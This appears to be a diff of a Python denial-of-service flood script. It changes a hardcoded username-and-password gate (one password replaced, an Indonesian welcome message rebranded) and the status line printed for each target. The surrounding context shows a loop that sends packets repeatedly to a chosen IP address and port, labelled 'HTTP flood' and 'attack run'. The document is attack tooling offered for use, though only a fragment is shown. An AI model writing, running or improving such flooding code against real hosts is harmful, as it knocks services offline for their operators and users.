@@ -52,8 +52,8 @@ while attemps < 100:
     username = input("\033[33mEnter your username: \033[0m")
     password = input("\033[32mEnter your password: \033[0m")
 
-    if username == '6453' and password == '6453':
-        print('Selamat datang di zona BASE!!')
+    if username == '6453' and password == 'kondangan-dl':
+        print('Selamat datang di zona SALMAN SENDIRI')
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -74,7 +74,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \033[33mBASE2  \033[31mHTTP flood  \033[36m" +str(ip)+ "::.. \033[0m")
+			print(i +" \033[33m::F A D H I L  \033[31mHTTP \033[32mFL00D  \033[36m" +str(ip)+ "\033[35m = \033[96mattack run\033[0m")
 		except:
 			print(i +" \033[32mBASE2  \033[34mHTTP flood  \033[36m" +str(ip)+ "::. \033[0m")
 def run2():
